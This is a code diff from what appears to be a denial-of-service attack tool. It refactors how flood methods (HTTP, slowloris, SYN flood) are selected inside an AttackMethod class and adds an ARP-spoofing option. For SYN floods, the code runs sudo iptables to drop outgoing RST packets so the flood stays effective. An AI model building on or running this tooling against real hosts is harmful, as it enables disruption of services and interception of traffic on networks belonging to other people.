@@ -16,34 +16,6 @@ from tools.addons.ip_tools import get_host_ip, get_target_address, get_target_do
 from tools.addons.sockets import create_socket, create_socket_proxy
 
 
-def get_method_by_name(method: str) -> Callable:
-    """Get the flood function based on the attack method.
-
-    Args:
-        - method - The method's name
-
-    Returns:
-        - flood_function - The associated flood function
-    """
-    if method in ["http", "http-proxy", "slowloris", "slowloris-proxy"]:
-        layer_number = 7
-    elif method in ["syn-flood"]:
-        rule = int(
-            os.popen(
-                f"sudo iptables --check OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP > /dev/null 2>&1; echo $?"
-            ).read()[0]
-        )
-        if rule:
-            os.system(
-                f"sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
-            )
-        layer_number = 4
-    directory = f"tools.L{layer_number}.{method}"
-    module = __import__(directory, fromlist=["object"])
-    flood_function = getattr(module, "flood")
-    return flood_function
-
-
 class AttackMethod:
     """Control the attack's inner operations."""
 
@@ -73,10 +45,39 @@ class AttackMethod:
         self.threads = []
         self.is_running = False
 
+    def get_method_by_name(self) -> None:
+        """Get the flood function based on the attack method.
+
+        Args:
+            None
+
+        Returns:
+            None
+        """
+        if self.method_name in ["http", "http-proxy", "slowloris", "slowloris-proxy"]:
+            self.layer_number = 7
+        elif self.method_name == "syn-flood":
+            rule = int(
+                os.popen(
+                    f"sudo iptables --check OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP > /dev/null 2>&1; echo $?"
+                ).read()[0]
+            )
+            if rule:
+                os.system(
+                    f"sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
+                )
+            self.layer_number = 4
+        elif self.method_name in ["arp-spoof"]:
+            self.layer_number = 2
+        directory = f"tools.L{self.layer_number}.{self.method_name}"
+        module = __import__(directory, fromlist=["object"])
+        self.method = getattr(module, "flood")
+
     def __enter__(self) -> AttackMethod:
-        """Set flood function and target's URL formatted attributes."""
-        self.method = get_method_by_name(self.method_name)
-        self.target = get_target_address(self.target)
+        """Set flood function and target attributes."""
+        self.get_method_by_name()
+        if self.layer_number != 2:
+            self.target = get_target_address(self.target)
         return self
 
     def __exit__(self, exc_type, exc_value, traceback) -> None:
@@ -171,8 +172,12 @@ class AttackMethod:
 
     def start(self) -> None:
         """Start the DoS attack itself."""
-        domain, port = get_target_domain(self.target)
-        ip = socket.gethostbyname(domain)
+        if self.layer_number == 2:
+            ip = self.target
+            port = "ARP"
+        else:
+            domain, port = get_target_domain(self.target)
+            ip = socket.gethostbyname(domain)
         duration = format_timespan(self.duration)
 
         print(
